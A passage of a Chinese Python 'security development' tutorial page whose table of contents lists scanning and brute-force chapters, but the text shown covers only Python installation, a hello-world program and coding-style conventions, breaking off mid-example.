<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Safe: 15-安全开发-python安全开发</title>
<meta name="generator" content="Org Mode" />
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="me" href="https://emacs.ch/@jasperhsu">
<meta name="google-adsense-account" content="ca-pub-1741779893655624">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
<!-- from -->
<!--
<style>#back-to-top{background:#000;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%;bottom:20px;-webkit-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);-moz-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);box-shadow:0 2px 5px 0 rgba(0,0,0,.26);color:#fff;cursor:pointer;display:block;height:56px;opacity:1;outline:0;position:fixed;right:20px;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-transition:bottom .2s,opacity .2s;-o-transition:bottom .2s,opacity .2s;-moz-transition:bottom .2s,opacity .2s;transition:bottom .2s,opacity .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:56px;z-index:1}#back-to-top svg{display:block;fill:currentColor;height:24px;margin:16px auto 0;width:24px}#back-to-top.hidden{bottom:-56px;opacity:0}</style>
-->
<link rel="stylesheet" href="/static/aandds.com/css/main.css">
<link rel="stylesheet" href="/static/aandds.com/css/drollery.min.css">
<script type="text/javascript" src="/static/aandds.com/js/main.js"></script>
<!--
<script id="MathJax-script" async="" src="/static/aandds.com/js/mathjax.js"></script>

<script type="text/javascript" src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
-->
<script>
  window.MathJax = {
    tex: {
      ams: {
        multlineWidth: '85%'
      },
      tags: 'ams',
      tagSide: 'right',
      tagIndent: '.8em'
    },
    chtml: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    svg: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    output: {
      font: 'mathjax-modern',
      displayOverflow: 'overflow'
    }
  };
</script>

<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">Safe: 15-安全开发-python安全开发</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#h:f6c92952-1632-48ed-91eb-babb451f005e">python 介绍、安装</a>
<ul>
<li><a href="#h:5bc79acc-56ce-4112-85f8-fe392d9d0ba2">Python介绍</a></li>
<li><a href="#h:f99deabb-0397-4457-a398-36d705c6a296">Python 的安装</a></li>
<li><a href="#h:cf03e2b7-f4b2-40e9-82e2-4435507f4730">集成开发环境（IDE）: PyCharm</a></li>
<li><a href="#h:4dfc398c-6c58-4e6a-a543-a17460087143">第一个 Python 程序</a></li>
</ul>
</li>
<li><a href="#h:ba442eb6-7d66-4ea3-9460-60a7ee06433d">python 基本语法</a>
<ul>
<li><a href="#h:45ae2609-efcb-44d5-8faa-34f6f1901c6b">语法规范</a>
<ul>
<li><a href="#h:bafa8789-1d9b-4032-80db-afbe871a2802">1、编码</a></li>
<li><a href="#h:6808ffcc-b968-4e4f-89d0-2fc7ceaeb947">2、代码格式</a></li>
<li><a href="#h:945e7a9b-12b0-4248-93e9-1ecdb9c6e747">3、import 语句</a></li>
<li><a href="#h:908b7df6-e79c-4db1-90f5-6e18d9ac33a9">4、空格</a></li>
<li><a href="#h:4904134f-19a7-4b6a-9406-46ab516b4efd">5、换行</a></li>
<li><a href="#h:688f805e-c428-42d1-aa5f-f054db455afe">6、docstring</a></li>
</ul>
</li>
<li><a href="#h:cdea3562-cd93-4f5c-95fd-67513671e52c">注释</a>
<ul>
<li><a href="#h:74fb0dc1-91dd-4493-a4be-278b9b060491">注释</a></li>
<li><a href="#h:bd01218a-bf6b-40ee-a182-b7af94bf6ce2">文档注释（Docstring）</a></li>
</ul>
</li>
<li><a href="#h:66b01db0-a6a8-4eac-9ead-6a57d9628188">命名规范</a>
<ul>
<li><a href="#h:3ff63196-bb63-4082-8428-085dd1456da0">1、模块</a></li>
<li><a href="#h:8661301d-d278-4f31-bbca-0e19422356fe">2、类名</a></li>
<li><a href="#h:e18887a8-8f23-4cae-83a2-8f08502f2cad">3、函数</a></li>
<li><a href="#h:4f63d038-3c71-411e-b315-7ff866e5bbd1">4、变量名</a></li>
<li><a href="#h:dce1de12-c262-4e04-81f5-666251a6a029">5、常量</a></li>
</ul>
</li>
<li><a href="#h:bb2b3d75-fb9c-4cb4-a7eb-bd7e1fb8ab4e">Python字符串</a>
<ul>
<li><a href="#h:3087ce68-725a-461a-9d14-120a5a17b460">字符串字面量</a></li>
<li><a href="#h:e4bc7bb5-541c-411e-a615-f177daa6496d">用字符串向变量赋值</a></li>
<li><a href="#h:c81829c2-d531-471d-a0be-fc9e45791f29">多行字符串</a></li>
<li><a href="#h:ba989442-eb19-4f68-a5c5-e8ba6b313942">字符串是数组</a></li>
<li><a href="#h:9890672a-6f4a-495d-99a9-b021efde6f3b">字符串方法</a></li>
<li><a href="#h:61b2d66c-4aa1-466f-8dc1-f7ce6223e17a">检查字符串</a></li>
<li><a href="#h:aadaa3c0-af4d-4305-885b-63e7028e6c4c">字符串级联（串联）</a></li>
<li><a href="#h:5b3d2604-a0a8-4304-ae6f-15dcfd491216">字符串格式</a></li>
<li><a href="#h:8db06633-2ae9-489c-882c-2fd8fb9defb9">Python 用作计算器</a></li>
<li><a href="#h:f85f8b14-b35d-4eab-96cc-4f29a24dd70d">走向编程的第一步</a></li>
<li><a href="#h:115d9a39-c2d1-4a83-808f-757b8157267c">print() 函数</a></li>
</ul>
</li>
<li><a href="#h:a372ce73-282c-4d01-b980-04e4d717e600">其他流程控制工具</a></li>
<li><a href="#h:97c4e1c0-7a9c-4d8e-8842-b0e90ea3b9ea">数据结构</a></li>
<li><a href="#h:52b76024-e8d4-402c-98c9-8855b4f637f1">模块</a></li>
<li><a href="#h:29a043a3-e402-431e-b5c3-04f9df6411ec">输入输出</a>
<ul>
<li><a href="#h:a4112f3b-e9ed-4bf5-bbc1-313081c81f31">读写文件</a></li>
</ul>
</li>
<li><a href="#h:7763971c-ab7d-45cd-a5a3-14e20aa7443a">类</a>
<ul>
<li><a href="#h:f3f8ab45-9b24-4aa3-9ee7-508df9f4edb2">其他</a>
<ul>
<li><a href="#h:9c5a5c89-5a72-4ce1-99ed-78bf2d34057b">类的call</a></li>
<li><a href="#h:4abfd0bb-710d-426c-9ed8-fddb9498dd27">classmethod</a></li>
<li><a href="#h:464a16ba-b03e-48a0-8f41-91c52913fc4f">staticmethod</a></li>
<li><a href="#h:d9103aa8-6acd-4d27-9fa1-73b24da13fc8">proprety</a></li>
<li><a href="#h:9ffa4de1-b49d-4c3e-816c-54eb88dc8630">装包，拆包</a></li>
<li><a href="#h:62b10327-f6a5-4718-88b5-dfa86593d988">闭包</a></li>
<li><a href="#h:7e5d640b-43b4-4361-a8ab-d1a08b2f2aa0">*args 和 **kwargs ？</a></li>
<li><a href="#h:781bdbbe-af9c-4343-aec8-8e6c6f154702">装饰器</a></li>
<li><a href="#h:0cd2ed59-1360-478d-afc0-4748dee8aca1">匿名函数</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:e8ecd8d8-886c-4412-8e84-c48afb72bfbe">异常和错误</a></li>
<li><a href="#h:7aa617e0-e7cb-40c9-9547-7e2c0e6d0765">虚拟环境和包</a></li>
</ul>
</li>
<li><a href="#h:bec5d77d-7b72-4984-9a88-1c703cdbc24e">python 安全应用编程入门</a>
<ul>
<li><a href="#h:1c64491e-e20e-42d1-bff9-015af7f7e906">Python 正则表达式</a>
<ul>
<li><a href="#h:2189deb7-3081-46ce-adfd-b83318a73392">基本语法</a>
<ul>
<li><a href="#h:d4f94820-c7b0-4311-9601-08b16653cfc6">元字符</a></li>
<li><a href="#h:b6aeeb71-9ec8-496f-bd67-8e83bb0c3d82">转义</a></li>
<li><a href="#h:477f125c-6bbd-43dc-8f81-35058b1213a7">重复</a></li>
<li><a href="#h:fcab0834-d33e-496b-8f77-eab839924097">或</a></li>
<li><a href="#h:ac2aaa83-ddc8-4e0e-a63f-aa6d029c00bd">捕获</a></li>
</ul>
</li>
<li><a href="#h:44cebff8-40de-485c-ba04-bad6bd647a88">字符集</a></li>
<li><a href="#h:fadae255-615c-4328-8549-08d349189d12">数量词</a></li>
<li><a href="#h:c3569ef5-e746-45fd-b9bc-d17ad926a8c0">贪婪与非贪婪</a></li>
<li><a href="#h:7701dccb-623f-4356-ae6e-4d3b4f222f0a">断言</a></li>
<li><a href="#h:ecef667e-d8f5-474c-a7d9-46a45e8bf8ae">边界匹配符和组</a></li>
<li><a href="#h:43cc32c8-724c-452a-b72d-2ffcffa3c759">re.sub</a></li>
<li><a href="#h:fe4c8b10-1e02-4186-a131-e636df0324ba">re.match 和 re.search</a></li>
<li><a href="#h:0c0faeaa-364a-4303-ab1e-9cf4fd749d12">正则习题</a></li>
</ul>
</li>
<li><a href="#h:16c98711-47c3-4f8f-a611-ccc4aee6c663">Python 网络编程</a>
<ul>
<li><a href="#h:ecedbab2-6916-4c20-a5f6-2bf14662e790">requests</a></li>
<li><a href="#h:dab78ada-7cea-4441-abe0-eb09f86737fb">安装requests</a></li>
<li><a href="#h:bc3e2dca-2adc-40ab-8b9a-69099e9696b3">发送请求</a></li>
<li><a href="#h:5bfe3ef8-74b5-4cea-b4c2-fb1e0e84c3e4">传递 URL 参数</a></li>
<li><a href="#h:2d86aec1-4940-42a9-91c3-489c4cd915de">响应内容</a></li>
<li><a href="#h:a763330e-544f-43de-9c53-d78c8e22b448">JSON 响应内容</a></li>
<li><a href="#h:4f694114-5901-4031-abe3-ff3f52b0924b">原始响应内容</a></li>
<li><a href="#h:b3a1964f-d82f-4dfa-b217-a762ed79b2d7">定制请求头</a></li>
<li><a href="#h:ce613c76-ed7b-4400-9805-1cb98270a8f2">POST 请求</a></li>
<li><a href="#h:5b83bfec-ecb8-460d-91aa-e8ef4d91dccd">响应状态码</a></li>
<li><a href="#h:bec5d9f3-fa34-4471-a7b0-2c5716abffa4">响应头</a></li>
<li><a href="#h:3d293bf9-f865-408c-a639-afa76527893b">Cookie</a></li>
<li><a href="#h:d39e6f48-90b0-46e6-a4a9-57a39e26adb4">重定向与请求历史</a></li>
<li><a href="#h:d30cf0a5-5529-4977-a1a8-755366f336fc">超时</a></li>
</ul>
</li>
<li><a href="#h:1b680218-a3b5-4ddf-abc4-66895b6e4542">Python数据库编程</a>
<ul>
<li><a href="#h:817295a0-bdfa-48c9-aae4-3692aba7214e">使用 MySQL-Connector Python 连接 MySQL 数据库</a></li>
<li><a href="#h:59a2e5cf-a6f0-4143-8d07-653fc7da3474">Python MySQL – Select Query</a></li>
<li><a href="#h:c1804228-66f1-4160-bbc4-a7e70f66409e">Python MySQL – Update Query</a></li>
<li><a href="#h:6276c43e-7cea-4fd6-913a-a8687babd5e8">Python使用ORM框架</a></li>
</ul>
</li>
<li><a href="#h:960c6d0c-849f-46cf-b70a-d7d916215b1f">Python多线程与多进程</a>
<ul>
<li><a href="#h:91e0effe-433f-43d3-8667-8efb5bffab07">进程和线程</a></li>
<li><a href="#h:02eda3bd-233c-4a23-bc26-314c267b95bf">Python的线程开发</a>
<ul>
<li><a href="#h:8d17ff66-4176-44ab-b52e-08ea51acf036">Thread类</a></li>
<li><a href="#h:36fc81d4-2961-4894-a140-99003adf3f3f">多线程</a></li>
<li><a href="#h:6cc292f0-df5e-472b-96a4-25482f75fdcf">线程安全</a></li>
<li><a href="#h:8a9ee09f-fe85-4359-810b-f81262f6ea8b">daemon线程</a></li>
<li><a href="#h:0e8c25b2-c64d-44fa-bd34-c79bbb8b530f">join方法</a></li>
</ul>
</li>
<li><a href="#h:894eb0fc-559d-4fbc-b449-83f217c6c2b1">线程同步</a>
<ul>
<li><a href="#h:a89bd8f4-632a-4022-86d1-ecd88c29fe71"><code>Event ***</code></a></li>
<li><a href="#h:72f5b3e0-5cde-4644-a027-8715fc1f3cd3"><code>Lock ***</code></a></li>
<li><a href="#h:650ef61f-59c0-40d5-8455-310ed5759919">Queue的线程安全</a></li>
</ul>
</li>
<li><a href="#h:d412ed10-48bd-4a30-ab1c-fe4911facf99">多进程</a>
<ul>
<li><a href="#h:d72e4e58-72f2-4425-8708-9b9dfed7bbf3">multiprocessing</a></li>
<li><a href="#h:d3980524-651a-4af7-b68b-dcad64a624d1">进程间同步</a></li>
<li><a href="#h:8d965a80-6376-4cd9-8bc8-08d36bd6dc5b">多进程、多线程的选择</a></li>
<li><a href="#h:c410f37f-5d6b-499f-a741-6517c9010c2b">concurrent.futures包</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:9d46125f-2d0a-4ae0-8ad8-3c6945257fcb">扫描与爆破</a>
<ul>
<li><a href="#h:5ecd84fc-d7ed-4840-bbc2-8d717839b4a4">python Mysql&amp;SqlServer 暴力破解</a></li>
<li><a href="#h:8516f423-4baf-4efc-9e67-b9284549373c">python 端口扫描</a></li>
<li><a href="#h:fe6c8962-a0d7-4780-9206-fbbd69af34ee">HTTP表单暴力破解</a></li>
</ul>
</li>
<li><a href="#h:b75269ab-df1e-4ef0-948d-d3fb1319c8e2">pyhon 信息收集工具编写</a>
<ul>
<li><a href="#h:8684a553-ec5f-4bea-9251-9f9aa4d09a17">密码字典生成器编写</a></li>
<li><a href="#h:02683805-9c1d-40d5-92a8-3b32c2d3cb1a">WEB目录扫描程序</a></li>
<li><a href="#h:7359c06f-7ae6-4389-83c1-cb38d1048d92">指纹识别工具开发</a></li>
<li><a href="#h:effe6363-5b38-43c7-b194-31139317c996">C段WEB服务扫描</a>
<ul>
<li><a href="#h:28b7b96d-9061-4c83-94e2-4df72827eea5">Argparse</a></li>
<li><a href="#h:11e4a758-b8d7-4ed8-96d8-18495826e65f">BeautifulSoup</a></li>
<li><a href="#h:03364af4-7b7a-4b46-8d75-960ce68bcfbf">asyncio &#x2014; 异步 I/O</a></li>
<li><a href="#h:0478780f-22dc-4e8e-ae36-7ac1f53acdda">C段扫描程序</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:816ea01e-f627-4c81-adf0-c287ca3ecdd7">python 爬虫技术实现</a>
<ul>
<li><a href="#h:4cbc9ab5-52ea-4d72-9540-a395043ee376">selenium 开发爬虫</a>
<ul>
<li><a href="#h:ee491f30-c71e-4b7f-92b1-56d427dfb639">安装selenium</a></li>
<li><a href="#h:07609fad-5b66-47a2-a22a-50bfbbd505d0">selenium 开发</a></li>
</ul>
</li>
<li><a href="#h:3b0a00e8-50ad-4f0e-a8fd-8d50d839973e">scrapy框架</a>
<ul>
<li><a href="#h:f5339e67-cfb0-4e42-b8ac-3c5ba4a4cf4b">Scrapy架构</a></li>
<li><a href="#h:8e1b2a48-9d4a-4190-a5f8-1e4c8f7202c8">数据流(Data flow)</a></li>
<li><a href="#h:b9cd8284-b335-4b96-a0aa-2aaa06b37aff">安装scrapy</a></li>
<li><a href="#h:1b8549de-8e4f-43f1-8ca6-158a323c8c7a">一个简单的爬虫示例</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</nav>
<ul class="org-ul">
<li>TAGS: <a href="../index.html">Safe</a><br></li>
</ul>


<p>
官方文档：<a href="https://docs.python.org/zh-cn/3/tutorial/index.html">https://docs.python.org/zh-cn/3/tutorial/index.html</a><br>
</p>
<section id="outline-container-h:f6c92952-1632-48ed-91eb-babb451f005e" class="outline-2">
<h2 id="h:f6c92952-1632-48ed-91eb-babb451f005e">python 介绍、安装</h2>
<div class="outline-text-2" id="text-h:f6c92952-1632-48ed-91eb-babb451f005e">
</div>
<div id="outline-container-h:5bc79acc-56ce-4112-85f8-fe392d9d0ba2" class="outline-3">
<h3 id="h:5bc79acc-56ce-4112-85f8-fe392d9d0ba2">Python介绍</h3>
<div class="outline-text-3" id="text-h:5bc79acc-56ce-4112-85f8-fe392d9d0ba2">
<p>
<b>Python 越来越火爆</b><br>
</p>

<p>
Python 在诞生之初，因为其功能不好，运转功率低，不支持多核，根本没有并发性可言，在计算功能不那么好的年代，一直没有火爆起来，甚至很多人根本不知道有这门语言。<br>
</p>

<p>
随着时代的发展，物理硬件功能不断提高，而软件的复杂性也不断增大，开发效率越来越被企业重视。因此就有了不一样的声音，在软件开发的初始阶段，性能并没有开发效率重要，没必然为了节省不到 1ms 的时间却让开发量增加好几倍，这样划不过来。也就是开发效率比机器效率更为重要，那么 Python 就逐渐得到越来越多开发者的亲睐了。<br>
</p>

<p>
在 12-14 年，云计算升温，大量创业公司和互联网巨头挤进云计算领域，而最著名的云核算开源渠道 OpenStack就是基于 Python 开发的。<br>
</p>

<p>
随后几年的备受关注的人工智能，机器学习首选开发语言也是 Python。<br>
</p>

<p>
至此，Python 已经成为互联网开发的焦点。在「Top 10 的编程语言走势图」可以看到，Python 已经跃居第三位，而且在 2017 年还成为了最受欢迎的语言。<br>
</p>

<p>
<b>Python 容易入门且功能强大</b><br>
</p>

<p>
如果你是一名初学者，学习 Python 就是你最好的选择，因为它容易学，功能强大，很容易就能构建 Web 应用，非常适合初学者作为入门的开发语言。<br>
</p>
</div>
</div>
<div id="outline-container-h:f99deabb-0397-4457-a398-36d705c6a296" class="outline-3">
<h3 id="h:f99deabb-0397-4457-a398-36d705c6a296">Python 的安装</h3>
<div class="outline-text-3" id="text-h:f99deabb-0397-4457-a398-36d705c6a296">
<p>
因为 Python 是跨平台的，它可以运行在 Windows、Mac 和各种 Linux/Unix 系统上。目前，Python 有两个版本，一个是 2.x 版，一个是 3.x版，这两个版本是不兼容的。本草根安装的是 3.6.1 版本的。<br>
</p>

<p>
至于在哪里下载，草根我建议大家最好直接官网下载，随时下载下来的都是最新版本。官网地址：<a href="https://www.python.org/">https://www.python.org/</a><br>
</p>

<p>
<b>windows 系统下安装配置</b><br>
</p>

<p>
如果是 windows 系统，下载完后，直接安装，不过这里记得勾上Add Python 3.6 to PATH，然后点 「InstallNow」 即可完成安装。<br>
</p>

<p>
这里要注意了，记得把「Add Python 3.6 to Path」勾上，勾上之后就不需要自己配置环境变量了，如果没勾上，就要自己手动配置。<br>
</p>

<p>
如果你一时手快，忘记了勾上 「Add Python 3.6 to Path」，那也不要紧，只需要手动配置一下环境变量就好了。<br>
</p>

<p>
在命令提示框中 cmd 上输入 ：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">path</span>=%path%;C:\Python
</pre>
</div>

<p>
特别特别注意： C:\Python 是 Python 的安装目录，如果你的安装目录是其他地方，就得填上你对应的目录。<br>
</p>

<p>
安装完成后，打开命令提示符窗口，敲入 python 后，出现下面的情况，证明 Python 安装成功了。<br>
</p>

<p>
而你看到提示符 &gt;&gt;&gt; 就表示我们已经在 Python 交互式环境中了，可以输入任何 Python 代码，回车后会立刻得到执行结果。<br>
</p>

<p>
<b>Mac 系统下安装配置</b><br>
</p>

<p>
MAC 系统一般都自带有 Python2.x 版本的环境，不过现在都不用 2.x 的版本了，所以建议你在 <a href="https://www.python.org/downloads/mac-osx/">https://www.python.org/downloads/mac-osx/</a> 上下载最新版安装。<br>
</p>

<p>
安装完成之后，如何配置环境变量呢？<br>
</p>

<p>
先查看当前环境变量：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">PATH</span>
</pre>
</div>

<p>
然后打开 ~/.bash_profile(没有请新建)<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">vi ~/.bash_profile
</pre>
</div>

<p>
我装的是 Python3.7 ，Python 执行路径为： /Library/Frameworks/Python. Framework/Versions/3.7/bin。于是写入<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">export</span> <span style="color: #a0522d;">PATH</span>=<span style="color: #8b2252;">"/Library/Frameworks/Python. Framework/Versions/3.7/bin:$PATH"</span>
</pre>
</div>

<p>
最后保存退出，激活运行一下文件：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">source</span> ~/.bash_profile
</pre>
</div>
</div>
</div>
<div id="outline-container-h:cf03e2b7-f4b2-40e9-82e2-4435507f4730" class="outline-3">
<h3 id="h:cf03e2b7-f4b2-40e9-82e2-4435507f4730">集成开发环境（IDE）: PyCharm</h3>
<div class="outline-text-3" id="text-h:cf03e2b7-f4b2-40e9-82e2-4435507f4730">
<p>
PyCharm 下载地址 : <a href="https://www.jetbrains.com/pycharm/download/">https://www.jetbrains.com/pycharm/download/</a><br>
</p>
</div>
</div>
<div id="outline-container-h:4dfc398c-6c58-4e6a-a543-a17460087143" class="outline-3">
<h3 id="h:4dfc398c-6c58-4e6a-a543-a17460087143">第一个 Python 程序</h3>
<div class="outline-text-3" id="text-h:4dfc398c-6c58-4e6a-a543-a17460087143">
<p>
现在我们可以来写一下第一个 Python 程序了。<br>
</p>

<p>
第一个 Python 程序当然是打印 Hello Cici 。<br>
</p>

<p>
新建一个文件，命名为 main.py , 注意，这里是以 .py 为后缀的文件。<br>
</p>

<p>
然后打开文件，输入 print('Hello {}'.format(name))<br>
</p>

<p>
运行结果<br>
代码文件<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">print_hi</span>(name):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'Hi, {}'</span>.<span style="color: #483d8b;">format</span>(name))

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
    print_hi(<span style="color: #8b2252;">'Cici'</span>)
</pre>
</div>
</div>
</div>
</section>
<section id="outline-container-h:ba442eb6-7d66-4ea3-9460-60a7ee06433d" class="outline-2">
<h2 id="h:ba442eb6-7d66-4ea3-9460-60a7ee06433d">python 基本语法</h2>
<div class="outline-text-2" id="text-h:ba442eb6-7d66-4ea3-9460-60a7ee06433d">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
<li>基本数据结构<br></li>
<li>函数<br></li>
<li>条件语句<br></li>
<li>错误与异常处理<br></li>
<li>循环语句<br></li>
<li>面向对象<br></li>
<li>文件输入输出<br></li>
<li>模块<br></li>
</ul>
</div>
<div id="outline-container-h:45ae2609-efcb-44d5-8faa-34f6f1901c6b" class="outline-3">
<h3 id="h:45ae2609-efcb-44d5-8faa-34f6f1901c6b">语法规范</h3>
<div class="outline-text-3" id="text-h:45ae2609-efcb-44d5-8faa-34f6f1901c6b">
<p>
官方文档：<a href="https://docs.python.org/zh-cn/3/tutorial/controlflow.html#intermezzo-coding-style">https://docs.python.org/zh-cn/3/tutorial/controlflow.html#intermezzo-coding-style</a><br>
</p>
</div>
<div id="outline-container-h:bafa8789-1d9b-4032-80db-afbe871a2802" class="outline-4">
<h4 id="h:bafa8789-1d9b-4032-80db-afbe871a2802">1、编码</h4>
<div class="outline-text-4" id="text-h:bafa8789-1d9b-4032-80db-afbe871a2802">
<p>
<b>源文件的字符编码</b><br>
</p>

<p>
<a href="https://docs.python.org/zh-cn/3/tutorial/interpreter.html#source-code-encoding">https://docs.python.org/zh-cn/3/tutorial/interpreter.html#source-code-encoding</a><br>
</p>
</div>
</div>
<div id="outline-container-h:6808ffcc-b968-4e4f-89d0-2fc7ceaeb947" class="outline-4">
<h4 id="h:6808ffcc-b968-4e4f-89d0-2fc7ceaeb947">2、代码格式</h4>
<div class="outline-text-4" id="text-h:6808ffcc-b968-4e4f-89d0-2fc7ceaeb947">
<ul class="org-ul">
<li>缩进<br>
统一使用 4 个空格进行缩进<br></li>
<li>行宽<br>
每行代码尽量不超过 80 个字符(在特殊情况下可以略微超过 80 ，但最长不得超过 120)<br>
理由：<br>
<ul class="org-ul">
<li>方便在控制台下查看代码<br></li>
<li>太长可能是设计有缺陷<br></li>
</ul></li>
<li>引号<br>
简单说，自然语言使用双引号，机器标示使用单引号，因此 代码里 多数应该使用 单引号<br>
<ul class="org-ul">
<li>自然语言 使用双引号 "&#x2026;"<br>
例如错误信息；很多情况还是 unicode，使用 u"你好世界"<br></li>
<li>机器标识 使用单引号 '&#x2026;' 例如 dict 里的 key<br></li>
<li>正则表达式 使用原生的双引号 r"&#x2026;"  如 r"\"  中\原样输出<br></li>
<li>文档字符串 (docstring) 使用三个双引号 """&#x2026;&#x2026;"""<br></li>
</ul></li>
<li><p>
空行<br>
</p>
<ul class="org-ul">
<li>模块级函数和类定义之间空两行；<br></li>
<li>类成员函数之间空一行；<br></li>
</ul>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">class</span> <span style="color: #228b22;">A</span>:

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">pass</span>

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">hello</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">pass</span>


<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">main</span>():
    <span style="color: #a020f0;">pass</span>
</pre>
</div>
<ul class="org-ul">
<li>可以使用多个空行分隔多组相关的函数<br></li>
<li>函数中可以使用空行分隔出逻辑相关的代码<br></li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:945e7a9b-12b0-4248-93e9-1ecdb9c6e747" class="outline-4">
<h4 id="h:945e7a9b-12b0-4248-93e9-1ecdb9c6e747">3、import 语句</h4>
<div class="outline-text-4" id="text-h:945e7a9b-12b0-4248-93e9-1ecdb9c6e747">
<p>
import 语句应该分行书写<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
<span style="color: #a020f0;">import</span> os
<span style="color: #a020f0;">import</span> sys

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;&#65292;&#19981;&#21516;&#27169;&#22359;&#19981;&#24314;&#35758;&#25918;&#22312;&#19968;&#36215;&#20889;</span>
<span style="color: #a020f0;">import</span> sys,os

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;&#12290;&#21516;&#27169;&#22359;&#20869;&#23548;&#20837;&#25918;&#19968;&#36215;&#20889;</span>
<span style="color: #a020f0;">from</span> subprocess <span style="color: #a020f0;">import</span> Popen, PIPE
</pre>
</div>

<p>
import语句应该使用 absolute import<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
<span style="color: #a020f0;">from</span> foo.bar <span style="color: #a020f0;">import</span> Bar
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;</span>
<span style="color: #a020f0;">from</span> ..bar <span style="color: #a020f0;">import</span> Bar
</pre>
</div>

<p>
import语句应该放在文件头部，置于模块说明及docstring之后，于全局变量之前；<br>
</p>

<p>
import语句应该按照顺序排列，每组之间用一个空行分隔<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> os
<span style="color: #a020f0;">import</span> sys

<span style="color: #a020f0;">import</span> msgpack
<span style="color: #a020f0;">import</span> zmq

<span style="color: #a020f0;">import</span> foo
</pre>
</div>

<p>
导入其他模块的类定义时，可以使用相对导入<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> myclass <span style="color: #a020f0;">import</span> MyClass
</pre>
</div>

<p>
如果发生命名冲突，则可使用命名空间<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> bar
<span style="color: #a020f0;">import</span> foo.bar

bar.Bar()
foo.bar.Bar()
</pre>
</div>
</div>
</div>
<div id="outline-container-h:908b7df6-e79c-4db1-90f5-6e18d9ac33a9" class="outline-4">
<h4 id="h:908b7df6-e79c-4db1-90f5-6e18d9ac33a9">4、空格</h4>
<div class="outline-text-4" id="text-h:908b7df6-e79c-4db1-90f5-6e18d9ac33a9">
<p>
在二元运算符两边各空一格 [=,-,+=,==,&gt;,in,is not, and] :<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
<span style="color: #a0522d;">i</span> = i + 1
<span style="color: #a0522d;">submitted</span> += 1
<span style="color: #a0522d;">x</span> = x * 2 - 1
<span style="color: #a0522d;">hypot2</span> = x * x + y * y
<span style="color: #a0522d;">c</span> = (a + b) * (a - b)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;</span>
<span style="color: #a0522d;">i</span>=i+1
<span style="color: #a0522d;">submitted</span> +=1
<span style="color: #a0522d;">x</span> = x*2 - 1
<span style="color: #a0522d;">hypot2</span> = x*x + y*y
<span style="color: #a0522d;">c</span> = (a+b) * (a-b)
</pre>
</div>

<p>
函数的参数列表中， , 之后要有空格<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20889;&#27861;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">complex</span>(real, imag):
    <span style="color: #a020f0;">pass</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25512;&#33616;&#30340;&#20889;&#27861;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">complex</span>(real,imag):
